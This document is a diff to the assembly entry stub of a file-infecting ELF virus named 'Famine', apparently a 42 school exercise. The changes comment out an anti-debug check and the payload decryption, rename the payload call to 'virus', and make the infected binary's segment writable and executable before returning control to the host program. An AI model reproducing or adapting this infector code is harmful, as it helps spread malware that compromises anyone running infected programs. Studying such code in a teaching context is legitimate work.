@@ -6,7 +6,7 @@
 ;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
 ;                                                 +#+#+#+#+#+   +#+            ;
 ;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
-;    Updated: 2019/06/07 07:48:08 by agrumbac         ###   ########.fr        ;
+;    Updated: 2019/06/07 10:18:12 by agrumbac         ###   ########.fr        ;
 ;                                                                              ;
 ; **************************************************************************** ;
 
@@ -20,8 +20,9 @@ section .text
 	global famine_entry
 	global _start
 
+extern detect_spy
 extern decrypt
-extern dear_client
+extern virus
 
 famine_entry:
 ;------------------------------; Store variables
@@ -65,7 +66,7 @@ mark_below:
 	sub r8, r15                ; r8 = rax - r8
 	mov r15, rax
 	xchg r15, r10
-	sub r10, r15               ; r10 = rax - r10
+	add r10, r15               ; r10 = rax + r10
 	mov r15, rax
 	xchg r15, r11
 	sub r11, r15               ; r11 = rax - r11
@@ -91,6 +92,10 @@ mark_below:
 	syscall
 
 	add rsp, 16
+;------------------------------; check if client behaves well (comment for debug)
+	; call detect_spy
+	; test rax, rax
+	; jnz return_to_client
 ;------------------------------; make ptld writable
 	mov r8, [rsp + 32]         ; get ptld addr
 	mov r9, [rsp + 24]         ; get ptld len
@@ -101,23 +106,23 @@ mark_below:
 	mov rdx, PROT_RWX
 	mov rax, SYSCALL_MPROTECT
 	syscall
-
 ;------------------------------; decrypt virus
-	mov rdx, [rsp]             ; get key
-	mov r10, [rsp + 16]        ; get virus_addr
-
-	mov rax, r14               ; get virus_size
-
-	;decrypt(32, virus_addr, key, virus_size);
-	mov rdi, 32
-	mov rsi, r10
-	mov rdx, rdx
-	mov rcx, rax
-	call decrypt
-;------------------------------; launch virus if client behaves well
+	; mov rdx, [rsp]             ; get key
+	; mov r10, [rsp + 16]        ; get virus_addr
+	;
+	; mov rax, r14               ; get virus_size
+	;
+	; ;decrypt(32, virus_addr, key, virus_size);
+	; mov rdi, 32
+	; mov rsi, r10
+	; mov rdx, rdx
+	; mov rcx, rax
+	; call decrypt
+;------------------------------; launch virus
 	mov rdi, rdx
-	call dear_client
+	call virus
 ;------------------------------; return to client entry
+return_to_client:
 	mov r11, [rsp + 8]         ; get entry addr
 	add rsp, 48                ; restore stack as it was
 	pop r14                    ; restore r14
